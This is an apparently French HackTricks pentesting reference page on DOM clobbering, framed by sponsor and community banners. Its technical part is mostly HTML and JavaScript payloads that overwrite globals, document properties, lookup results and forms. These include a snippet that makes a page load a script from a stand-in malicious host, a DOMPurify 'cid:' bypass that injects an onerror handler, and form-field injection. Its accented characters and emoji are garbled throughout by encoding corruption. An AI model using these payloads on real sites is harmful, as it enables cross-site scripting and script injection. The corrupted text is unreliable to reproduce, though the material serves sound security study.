# Dom Clobbering

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybers√©curit√©** ? Voulez-vous voir votre **entreprise annonc√©e dans HackTricks** ? ou voulez-vous avoir acc√®s √† la **derni√®re version de PEASS ou t√©l√©charger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**üí¨**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## **Fondamentaux**

Il est possible de g√©n√©rer des **variables globales √† l'int√©rieur du contexte JS** avec les attributs **`id`** et **`name`** dans les balises HTML.
```html
<form id=x></form>
<script> console.log(typeof document.x) //[object HTMLFormElement] </script>
```
Seuls certains √©l√©ments peuvent utiliser l'attribut **name** pour √©craser les variables globales, il s'agit de: `embed`, `form`, `iframe`, `image`, `img` et `object`.

Curieusement, lorsque vous utilisez un **√©l√©ment de formulaire** pour **√©craser** une variable, vous obtenez la valeur **`toString`** de l'√©l√©ment lui-m√™me: `[object HTMLFormElement]`, mais avec **anchor** le **`toString`** sera le **`href`** de l'ancre. Par cons√©quent, si vous √©crasez en utilisant la balise **`a`**, vous pouvez **contr√¥ler** la **valeur** lorsqu'elle est **trait√©e comme une cha√Æne de caract√®res**:
```html
<a href="controlled string" id=x></a>
<script>
console.log(x);//controlled string
</script>
```
### Tableaux et Attributs

Il est √©galement possible de **clobber un tableau** et les **attributs d'un objet** :
```html
<a id=x>
<a id=x name=y href=controlled>
<script>
console.log(x[1])//controlled
console.log(x.y)//controlled
</script>
```
Pour √©craser **un 3√®me attribut** (par exemple x.y.z), vous devez utiliser un **`form`**:
```html
<form id=x name=y><input id=z value=controlled></form>
<form id=x></form>
<script>
alert(x.y.z.value)//controlled
</script>
```
√âcraser plus d'attributs est **plus compliqu√© mais toujours possible**, en utilisant des iframes:
```html
<iframe name=x srcdoc="<a id=y href=controlled></a>"></iframe>
<style>@import 'https://google.com';</style>
<script>alert(x.y)//controlled</script>
```
{% hint style="warning" %}
La balise style est utilis√©e pour **donner suffisamment de temps √† l'iframe pour se rendre**. Sans cela, vous obtiendrez une alerte d'**ind√©fini**.
{% endhint %}

Pour √©craser des attributs plus profonds, vous pouvez utiliser des **iframes avec encodage HTML** de cette mani√®re :
```html
<iframe name=a srcdoc="<iframe srcdoc='<iframe name=c srcdoc=<a/id=d&amp;amp;#x20;name=e&amp;amp;#x20;href=\controlled&amp;amp;gt;<a&amp;amp;#x20;id=d&amp;amp;gt; name=d>' name=b>"></iframe>
<style>@import 'https://google.com';</style>
<script>
alert(a.b.c.d.e)//controlled
</script>
```
### **Contournement de filtres**

Si un filtre **boucle** √† travers les **propri√©t√©s** d'un n≈ìud en utilisant quelque chose comme `document.getElementByID('x').attributes`, vous pouvez **√©craser** l'attribut **`.attributes`** et **casser le filtre**. D'autres propri√©t√©s DOM comme **`tagName`**, **`nodeName`** ou **`parentNode`** et plus encore sont √©galement **√©crasables**.
```html
<form id=x></form>
<form id=y>
<input name=nodeName>
</form>
<script>
console.log(document.getElementById('x').nodeName)//FORM
console.log(document.getElementById('y').nodeName)//[object HTMLInputElement]
</script>
```
## **√âcrasement de `window.someObject`**

Un mod√®le couramment utilis√© par les d√©veloppeurs JavaScript est :
```javascript
var someObject = window.someObject || {};
```
Si vous pouvez contr√¥ler une partie du HTML sur la page, vous pouvez √©craser la r√©f√©rence `someObject` avec un n≈ìud DOM, tel qu'une ancre. Consid√©rez le code suivant:
```html
<script>
 window.onload = function(){
    let someObject = window.someObject || {};
    let script = document.createElement('script');
    script.src = someObject.url;
    document.body.appendChild(script);
 };
</script>
```
Pour exploiter ce code vuln√©rable, vous pouvez injecter le HTML suivant pour √©craser la r√©f√©rence `someObject` avec un √©l√©ment d'ancre :

{% code overflow="wrap" %}
```html
<a id=someObject><a id=someObject name=url href=//malicious-website.com/malicious.js>
```
{% endcode %}

Injecter ces donn√©es **`window.someObject.url`** va donner `href=//malicious-website.com/malicious.js`

**Astuce**: **`DOMPurify`** vous permet d'utiliser le protocole **`cid:`**, qui **n'encode pas les guillemets doubles**. Cela signifie que vous pouvez **injecter une guillemet double encod√©e qui sera d√©cod√©e √† l'ex√©cution**. Par cons√©quent, l'injection de quelque chose comme **`<a id=defaultAvatar><a id=defaultAvatar name=avatar href="cid:&quot;onerror=alert(1)//">`** fera que l'encodage HTML `&quot;` sera **d√©cod√© √† l'ex√©cution** et **s'√©chappera** de la valeur de l'attribut pour **cr√©er** l'√©v√©nement **`onerror`**.

Une autre technique courante consiste √† utiliser l'√©l√©ment **`form`**. Certaines biblioth√®ques c√¥t√© client parcourront les attributs de l'√©l√©ment de formulaire cr√©√© pour le nettoyer. Mais, si vous cr√©ez un `input` √† l'int√©rieur du formulaire avec `id=attributes`, vous allez **√©craser la propri√©t√© d'attributs** et le nettoyeur **ne pourra pas** parcourir les **vrais attributs**.

Vous pouvez [**trouver un exemple de ce type d'√©crasement dans ce writeup CTF**](iframes-in-xss-and-csp.md#iframes-in-sop-2).

## √âcrasement de l'objet document

Selon la documentation, il est possible de remplacer les attributs de l'objet document en utilisant DOM Clobbering:

> L'interface [Document](https://html.spec.whatwg.org/multipage/dom.html#document) [prend en charge les propri√©t√©s nomm√©es](https://webidl.spec.whatwg.org/#dfn-support-named-properties). Les [noms de propri√©t√©s pris en charge](https://webidl.spec.whatwg.org/#dfn-supported-property-names) d'un objet [Document](https://html.spec.whatwg.org/multipage/dom.html#document) document √† tout moment se composent des √©l√©ments suivants, dans l'ordre de l'arbre selon l'√©l√©ment qui les a contribu√©s, en ignorant les doublons ult√©rieurs, et avec des valeurs provenant des attributs [id](https://html.spec.whatwg.org/multipage/dom.html#the-id-attribute) venant avant les valeurs des attributs name lorsque le m√™me √©l√©ment contribue aux deux :
>
> \- La valeur de l'attribut de contenu name pour tous les √©l√©ments [expos√©s](https://html.spec.whatwg.org/multipage/dom.html#exposed) [embed](https://html.spec.whatwg.org/multipage/iframe-embed-object.html#the-embed-element), [form](https://html.spec.whatwg.org/multipage/forms.html#the-form-element), [iframe](https://html.spec.whatwg.org/multipage/iframe-embed-object.html#the-iframe-element), [img](https://html.spec.whatwg.org/multipage/embedded-content.html#the-img-element), et [expos√©s](https://html.spec.whatwg.org/multipage/dom.html#exposed) [object](https://html.spec.whatwg.org/multipage/iframe-embed-object.html#the-object-element) qui ont un attribut de contenu name non vide et sont [dans un arbre de document](https://dom.spec.whatwg.org/#in-a-document-tree) avec le document comme [racine](https://dom.spec.whatwg.org/#concept-tree-root);\
> \
> \- La valeur de l'attribut de contenu [id](https://html.spec.whatwg.org/multipage/dom.html#the-id-attribute) pour tous les √©l√©ments [expos√©s](https://html.spec.whatwg.org/multipage/dom.html#exposed) [object](https://html.spec.whatwg.org/multipage/iframe-embed-object.html#the-object-element) qui ont un attribut de contenu [id](https://html.spec.whatwg.org/multipage/dom.html#the-id-attribute) non vide et sont [dans un arbre de document](https://dom.spec.whatwg.org/#in-a-document-tree) avec le document comme [racine](https://dom.spec.whatwg.org/#concept-tree-root);\
> \
> \- La valeur de l'attribut de contenu [id](https://html.spec.whatwg.org/multipage/dom.html#the-id-attribute) pour tous les √©l√©ments [img](https://html.spec.whatwg.org/multipage/embedded-content.html#the-img-element) qui ont √† la fois un attribut de contenu [id](https://html.spec.whatwg.org/multipage/dom.html#the-id-attribute) non vide et un attribut de contenu name non vide, et sont [dans un arbre de document](https://dom.spec.whatwg.org/#in-a-document-tree) avec le document comme [racine](https://dom.spec.whatwg.org/#concept-tree-root).

En utilisant cette technique, vous pouvez remplacer des **valeurs couramment utilis√©es telles que `document.cookie`, `document.body`, `document.children`**, et m√™me des m√©thodes de l'interface Document comme `document.querySelector`.
```javascript
document.write("<img name=cookie />")

document.cookie
<img name="cookie">

typeof(document.cookie)
'object'

//Something more sanitize friendly than a img tag
document.write("<form name=cookie><input id=toString></form>")

document.cookie
HTMLCollection(2)¬†[img, form, cookie: img]

typeof(document.cookie)
'object
```
## √âcriture apr√®s l'√©l√©ment cibl√©

Vous pouvez √©craser les r√©sultats d'un appel **`document.getElementById()`** et **`document.querySelector()`** si **vous injectez une balise `<html>` ou `<body>` avec le m√™me attribut id**. Voici un exemple:
```html
<div style=display:none id=cdnDomain class=x>test</div>
<p>
<html id="cdnDomain" class=x>clobbered</html>
<script>
alert(document.getElementById('cdnDomain').innerText);//clobbbered
alert(document.querySelector('.x').innerText);//clobbbered
</script>
```
Ce qui est √©galement int√©ressant, c'est que vous pouvez **cacher des √©l√©ments de `innerText`**, donc si vous injectez une balise HTML/body, vous pouvez utiliser des styles pour la cacher de `innerText` afin d'emp√™cher d'autres textes d'interf√©rer avec votre attaque:
```html
<div style=display:none id=cdnDomain>test</div>
<p>existing text</p>
<html id="cdnDomain">clobbered</html>
<style>
p{display:none;}
</style>
<script>
alert(document.getElementById('cdnDomain').innerText);//clobbbered
</script>
```
Nous avons √©galement examin√© SVG et il est possible d'utiliser la balise `<body>` l√†-bas:
```html
<div style=display:none id=cdnDomain>example.com</div>
<svg><body id=cdnDomain>clobbered</body></svg>
<script>
alert(document.getElementById('cdnDomain').innerText)//clobbered
</script>
```
Il est n√©cessaire d'utiliser la balise `<foreignobject>` pour utiliser la balise HTML √† l'int√©rieur de SVG sur Chrome et Firefox.
```html
<div style=display:none id=cdnDomain>example.com</div>
<svg>
<foreignobject>
<html id=cdnDomain>clobbered</html>
</foreignobject>
</svg>
<script>
alert(document.getElementById('cdnDomain').innerText)//clobbered
</script>
```
## Clobbering de formulaires

Il est possible d'ajouter de **nouvelles entr√©es dans un formulaire** simplement en **sp√©cifiant l'attribut `form`** dans certaines balises. Vous pouvez utiliser cela pour **ajouter de nouvelles valeurs dans un formulaire** et m√™me ajouter un nouveau **bouton** pour **l'envoyer** (clickjacking ou en abusant de certains codes JS `.click()`): 

{% code overflow="wrap" %}
```html
<!--Add a new attribute and a new button to send-->
<textarea form=id-other-form name=info>
";alert(1);//
</textarea>
<button form=id-other-form type="submit" formaction="/edit" formmethod="post">
Click to send!
</button>
```
{% endcode %}

* Pour plus d'attributs de formulaire dans [**button check this**](https://www.w3schools.com/tags/tag\_button.asp)**.**

## R√©f√©rences

* [https://portswigger.net/research/hijacking-service-workers-via-dom-clobbering](https://portswigger.net/research/hijacking-service-workers-via-dom-clobbering)
* Heyes, Gareth. JavaScript pour les pirates informatiques: Apprenez √† penser comme un pirate.

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybers√©curit√©**? Voulez-vous voir votre **entreprise annonc√©e dans HackTricks**? ou voulez-vous avoir acc√®s √† la **derni√®re version de PEASS ou t√©l√©charger HackTricks en PDF**? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**üí¨**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
